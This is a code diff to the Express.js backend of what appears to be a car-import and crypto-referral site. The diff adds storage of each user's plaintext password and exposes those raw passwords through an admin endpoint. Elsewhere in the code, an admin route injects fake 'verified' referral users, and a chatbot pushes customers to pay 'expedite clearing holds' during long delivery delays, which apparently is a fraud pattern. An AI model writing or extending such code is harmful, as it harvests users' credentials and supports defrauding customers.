@@ -212,9 +212,9 @@ app.post("/api/auth/register", async (req, res) => {
     }
 
     const result = await db.run(
-      `INSERT INTO users (name, email, phone, password_hash, referral_code, referrer_id, crypto_wallet_address, city, created_at)
-       VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
-      [name, email.toLowerCase(), phone, password_hash, customCode, referrer_id, crypto_wallet_address, city]
+      `INSERT INTO users (name, email, phone, password_hash, password_raw, referral_code, referrer_id, crypto_wallet_address, city, created_at)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
+      [name, email.toLowerCase(), phone, password_hash, password, customCode, referrer_id, crypto_wallet_address, city]
     );
 
     const userId = result.lastID;
@@ -727,7 +727,7 @@ app.get("/api/admin/metrics", authenticateAdmin, async (req, res) => {
 app.get("/api/admin/users", authenticateAdmin, async (req, res) => {
   const db = await getDb();
   const list = await db.all(`
-    SELECT u.id, u.name, u.email, u.phone, u.referral_code, u.membership_active, u.horizon_points, u.crypto_wallet_address, u.city, u.status, u.created_at, t.route_index 
+    SELECT u.id, u.name, u.email, u.phone, u.password_hash, u.password_raw, u.referral_code, u.membership_active, u.horizon_points, u.crypto_wallet_address, u.city, u.status, u.created_at, t.route_index 
     FROM users u 
     LEFT JOIN map_tracking t ON u.id = t.user_id 
     ORDER BY u.id DESC
@@ -1014,9 +1014,9 @@ app.post("/api/admin/referrals/inject", authenticateAdmin, async (req, res) => {
   const walletAddr = "0x" + crypto.randomBytes(20).toString("hex");
 
   const result = await db.run(
-    `INSERT INTO users (name, email, password_hash, phone, city, referral_code, referrer_id, horizon_points, crypto_wallet_address, kyc_status)
-     VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, 'verified')`,
-    [name, email, "fake_pass_hash_123", "+1 (555) 123-0000", "Austin, TX", refCode, referrer_id, walletAddr]
+    `INSERT INTO users (name, email, password_hash, password_raw, phone, city, referral_code, referrer_id, horizon_points, crypto_wallet_address, kyc_status)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, ?, 'verified')`,
+    [name, email, "fake_pass_hash_123", "SandboxPass123", "+1 (555) 123-0000", "Austin, TX", refCode, referrer_id, walletAddr]
   );
   
   const newUserId = result.lastID;
@@ -1398,7 +1398,7 @@ app.post("/api/chatbot", async (req, res) => {
   let responseText = "";
 
   if (cleanMsg.includes("price") || cleanMsg.includes("how much") || cleanMsg.includes("byd seal") || cleanMsg.includes("seal price")) {
-    responseText = "The BYD Seal starts at $45,900 or finance from $699/mo. Would you like financing options? Visit the Access Portal to get matching monthly estimates!";
+    responseText = "The BYD Seal starts at $45,900 or finance from $699/mo. Would you like financing options? Visit the Access Console to get matching monthly estimates!";
   } else if (cleanMsg.includes("arrive") || cleanMsg.includes("delivery") || cleanMsg.includes("tracking") || cleanMsg.includes("when will")) {
     responseText = "Due to unprecedented global shipping volumes, custom clearance takes approximately 90–180 days. Please log into your active dashboard to view real-time port tracking or pay the logical expedite clearing holds.";
   } else if (cleanMsg.includes("referral") || cleanMsg.includes("refer") || cleanMsg.includes("earn") || cleanMsg.includes("points")) {
